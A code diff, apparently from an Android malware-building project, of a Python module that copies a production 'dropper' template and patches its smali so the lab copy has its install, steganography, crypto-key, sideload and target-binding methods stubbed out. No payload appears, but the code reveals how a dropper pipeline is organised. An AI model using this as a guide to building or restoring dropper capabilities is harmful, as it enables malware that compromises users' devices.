@@ -1,4 +1,3 @@
-"""Template dropper_rebuild_lab — manifest prod, DEX sem install/crypto/sideload."""
 
 from __future__ import annotations
 
@@ -17,15 +16,12 @@ _INSTALL_MARKER = "# lab_no_install"
 _STEGO_STUB_MARKER = "# lab_no_stego"
 _TARGET_STUB_MARKER = "# lab_no_target"
 
-
 def dropper_lab_template_backup_zip() -> str:
     return Config.DROPPER_LAB_TEMPLATE_BACKUP_ZIP
-
 
 def dropper_lab_template_ready() -> bool:
     lab_dir = Config.DROPPER_LAB_TEMPLATE
     return os.path.isfile(os.path.join(lab_dir, _LAB_MARKER))
-
 
 def _replace_smali_method(content: str, method_decl: str, body: str) -> str:
     pattern = re.compile(re.escape(method_decl) + r"[\s\S]*?\.end method")
@@ -34,7 +30,6 @@ def _replace_smali_method(content: str, method_decl: str, body: str) -> str:
     if count != 1:
         raise RuntimeError(f"smali patch failed: {method_decl!r} (matches={count})")
     return content
-
 
 def _patch_file(lab_dir: str, prod_dir: str, rel_path: str, patch_fn) -> None:
     src = os.path.join(prod_dir, rel_path)
@@ -48,7 +43,6 @@ def _patch_file(lab_dir: str, prod_dir: str, rel_path: str, patch_fn) -> None:
     content = patch_fn(content)
     with open(dst, "w", encoding="utf-8") as handle:
         handle.write(content)
-
 
 def _patch_lab_up_smali(content: str) -> str:
     if _STEGO_MARKER in content:
@@ -83,7 +77,6 @@ def _patch_lab_up_smali(content: str) -> str:
 
     return content
 
-
 def _stub_rp_smali(content: str) -> str:
     if _INSTALL_MARKER in content:
         return content
@@ -96,7 +89,6 @@ def _stub_rp_smali(content: str) -> str:
     return-object p0"""
     return _replace_smali_method(content, ".method public final i(Ljava/lang/Object;)Ljava/lang/Object;", body)
 
-
 def _stub_tp_smali(content: str) -> str:
     if _STEGO_STUB_MARKER in content:
         return content
@@ -106,7 +98,6 @@ def _stub_tp_smali(content: str) -> str:
     const/4 p0, 0x0
     return-object p0"""
     return _replace_smali_method(content, ".method public final i(Ljava/lang/Object;)Ljava/lang/Object;", body)
-
 
 def _stub_d40_install(content: str) -> str:
     if _INSTALL_MARKER in content:
@@ -128,7 +119,6 @@ def _stub_d40_install(content: str) -> str:
         f"    .locals 0\n    {_INSTALL_MARKER}\n    return-void",
     )
     return content
-
 
 def _strip_vd_crypto_keys(content: str) -> str:
     if "# lab_no_crypto_keys" in content:
@@ -176,7 +166,6 @@ def _strip_vd_crypto_keys(content: str) -> str:
             raise RuntimeError(f"lab vd.smali: falha strip crypto keys ({pattern[:40]}...)")
     return content
 
-
 def _stub_main_activity(content: str) -> str:
     if _TARGET_STUB_MARKER in content:
         return content
@@ -204,7 +193,6 @@ def _stub_main_activity(content: str) -> str:
 
     return content
 
-
 def _stub_install_result_receiver(content: str) -> str:
     if _INSTALL_MARKER in content:
         return content
@@ -214,7 +202,6 @@ def _stub_install_result_receiver(content: str) -> str:
         ".method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V",
         body,
     )
-
 
 def apply_lab_template_patches(lab_dir: str) -> None:
     prod_dir = ensure_dropper_template_ready()
@@ -249,7 +236,6 @@ def apply_lab_template_patches(lab_dir: str) -> None:
             "dex stripped install/crypto/sideload/target-bind\n"
         )
 
-
 def _copy_production_template(lab_dir: str) -> None:
     src = ensure_dropper_template_ready()
     if os.path.isdir(lab_dir):
@@ -261,7 +247,6 @@ def _copy_production_template(lab_dir: str) -> None:
         return []
 
     shutil.copytree(src, lab_dir, ignore=_ignore)
-
 
 def ensure_dropper_lab_template_ready() -> str:
     lab_dir = Config.DROPPER_LAB_TEMPLATE
